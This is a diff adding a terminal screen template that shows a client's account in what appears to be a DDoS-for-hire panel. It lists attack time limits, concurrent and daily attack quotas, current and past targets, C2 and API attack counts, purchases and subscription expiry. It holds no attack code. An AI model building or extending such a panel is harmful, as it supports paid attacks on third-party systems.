@@ -1,0 +1,41 @@
+<<clear()>>
+<<full_screen_custom(80x43)>>
+
+[38;5;45mCLIENT INFORMATION[0m
+  ├── [38;5;255mUsername[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.username>>[0m
+  ├── [38;5;255mNew User[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.new_user>>[0m    
+  ├── [38;5;255mSSH Client[0m[38;5;046m:[38;5;255m [38;5;255m<<$os>>[0m
+  ├── [38;5;255mVIP Access[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.vip>>[0m
+  ├── [38;5;255mMax Attacks Time[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.max_time>>[0m
+  ├── [38;5;255mMax Concurrent Attacks[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.max_concurrents>>[0m
+  ├── [38;5;255mRemaining Daily Attacks[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.daily_attack_left>>[0m
+  ├── [38;5;255mAttack Limit Per Day[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.daily_attack_limit>>[0m
+  ├── [38;5;255mTotal Attacks[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.attacks_count>>[0m
+  ├── [38;5;255mTotal Purchase[0m[38;5;046m: [38;5;255m<<$user.total_purchases>>[0m
+  ├── [38;5;255mTotal Failed Purchase[0m[38;5;046m: [38;5;255m<<$user.total_purchases_failed>>[0m  
+  └── [38;5;255mLogin Count[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.login_count>>[0m
+
+[38;5;45mCLIENT ATTACKS[0m
+  ├── [38;5;255mLatest Target[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.attacks_latest>>[0m
+  ├── [38;5;255mMost Frequent Target[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.most_frequent_target>>[0m
+  ├── [38;5;255mOngoing Attacks[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.ongoing>>[0m
+  ├── [38;5;255mGlobal Peak Attack Hour Today[0m[38;5;046m:[38;5;255m [38;5;255m<<$attack_peak_hour_today>>[0m
+  ├── [38;5;255mCurrent Targets[0m[38;5;046m:[38;5;255m [38;5;255m<<$current_attack_targets>>[0m
+  ├── [38;5;255mTotal API Attacks[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.total_attack_api>>[0m
+  └── [38;5;255mTotal C2 Attacks[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.total_attack_c2>>[0m
+
+[38;5;45mCLIENT ACCESS[0m
+  ├── [38;5;255mCustom Role[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.custom_role>>[0m
+  ├── [38;5;255mPrivate Access[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.private>>[0m
+  ├── [38;5;255mAPI Access[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.api>>[0m
+  ├── [38;5;255mVIP Access[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.vip>>[0m
+  ├── [38;5;255mHolder Access[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.holder>>[0m  
+
+[38;5;45mEXPIRY INFORMATION[0m
+  ├── [38;5;255mNew User[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.new_user>>[0m  
+  ├── [38;5;255mInitial Days[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.initial_days>>[0m     
+  ├── [38;5;255mTime Until Expiry[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.days_left>>[0m days
+  ├── [38;5;255mExpiry Date (Format 1)[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.time_expiry_fmt_1>>[0m
+  ├── [38;5;255mExpiry Date (Format 2)[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.time_expiry_fmt_2>>[0m
+  └── [38;5;255mDays Since Creation[0m[38;5;046m:[38;5;255m [38;5;255m<<$user.time_since_creation>>[0m
+
